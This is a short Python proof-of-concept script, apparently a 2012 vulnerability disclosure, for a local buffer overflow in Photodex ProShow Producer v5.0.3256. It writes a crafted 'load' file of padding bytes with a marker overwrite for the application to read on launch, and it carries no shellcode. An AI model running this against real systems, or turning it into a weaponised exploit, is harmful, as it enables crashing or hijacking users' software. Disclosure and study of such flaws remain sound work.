#!/usr/bin/python
 
# Exploit Title: Photodex ProShow Producer v5.0.3256 Local Buffer Overflow Vulnerability PoC
# Version:       v5.0.3256
# Date:          2012-07-02
# Author:        Julien Ahrens
# Homepage:      http://www.inshell.net
# Software Link: http://www.photodex.com
# Tested on:     Windows XP SP3 Professional German
# Notes:         -
# Howto:         Place file into appdir -> launch

file="load"

junk1="\x41" * 9848
boom="\x42\x42\x42\x42"
junk2="\x43" * 100

poc=junk1 + boom + junk2

try:
    print "[*] Creating exploit file...\n";
    writeFile = open (file, "w")
    writeFile.write( poc )
    writeFile.close()
    print "[*] File successfully created!";
except:
    print "[!] Error while creating file!";
